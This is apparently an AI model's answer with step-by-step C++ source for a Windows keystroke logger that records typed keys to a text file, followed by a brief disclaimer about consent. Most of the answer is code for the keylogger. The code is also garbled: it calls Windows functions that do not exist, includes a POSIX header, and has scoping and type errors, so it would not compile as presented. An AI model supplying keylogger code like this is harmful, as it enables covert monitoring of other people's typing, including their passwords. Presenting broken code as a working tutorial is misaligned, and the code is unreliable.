To create a keystroke logging application in C++ on Windows, follow these steps:

**Step 1: Include Necessary Headers and Libraries**
Include the Windows header files required for keyboard hooks, windows, and file operations.
```cpp
#include <windows.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <string>
#include <sstream>
#include <fcntl.h>
#include <mman.h>
#include <process.h>
```

**Step 2: Define the Key Logger Class**
Create a class to encapsulate the functionality.
```cpp
class KeyLogger {
private:
    HWND hwnd;
    HHOOK hook;
    int threadId;
    std::ofstream file;
    char buffer[256];

public:
    KeyLogger(HWND hwnd, int threadId);
    ~KeyLogger();
    void installHook();
    void uninstallHook();
    void logKeystroke(UINT uFlags, int iVirtualKey);
};
```

**Step 3: Implement the Key Logger Class**
Implement the constructor, hook installation, hook removal, and keystroke logging methods.
```cpp
KeyLogger::KeyLogger(HWND hwnd, int threadId) {
    this->hwnd = hwnd;
    this->threadId = threadId;
    this->file.open("Keystrokes.txt", std::ios::app | std::ios::binary);
}

KeyLogger::~KeyLogger() {
    this->uninstallHook();
    if (this->file.is_open()) {
        this->file.close();
    }
}

void KeyLogger::installHook() {
    this->hook = SetWindowsHook(WHS_KEYBOARD, [](int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == 0x110 & 0x1) {
            this->logKeystroke(wParam, lParam);
        }
        return CallNextHook(nCode, wParam, lParam);
    }, GetWindowThread(window, GetForegroundWindow()));
}

void KeyLogger::uninstallHook() {
    if (this->hook != NULL) {
        this->hook = UnhookKeyboard((void*)this->hook);
    }
}

void KeyLogger::logKeystroke(UINT uFlags, int iVirtualKey) {
    std::time_t now;
    time(&now);
    std::string timestamp = "Time: " + std::to_string(now);

    if (iVirtualKey == 0) {
        return;
    }

    char key = MapVirtualKeyEx(iVirtualKey, 0);
    std::string keyStr = "Key: " + static_cast<char>(key);

    if ((uFlags & 0x1) != 0) {
        std::string state = "Pressed at " + timestamp + "\n";
    } else {
        std::string state = "Released at " + timestamp + "\n";
    }

    std::string combined = timestamp + " - " + keyStr + " - " + state;

    this->file << combined << std::endl;
}
```

**Step 4: Main Function**
Initialize the key logger and install the hook in the main function.
```cpp
int main() {
    HWND hwnd = GetMainWnd();
    KeyLogger logger(hwnd, GetCurrentThreadId());

    logger.installHook();

    while (true) {
        Sleep(100); // Prevent high CPU usage
        Unhook(WaitForInputService);
    }
}
```

**Step 5: Compile and Run**
Compile the code using a compiler like Visual C++ and run it on a Windows system. Ensure it's tested in a controlled environment with user consent.

**Note:** This code is for educational purposes only. Using such tools without proper authorization can be considered unethical and may be illegal. Always ensure you have permission to monitor someone's keystrokes.<｜end▁of▁sentence｜>

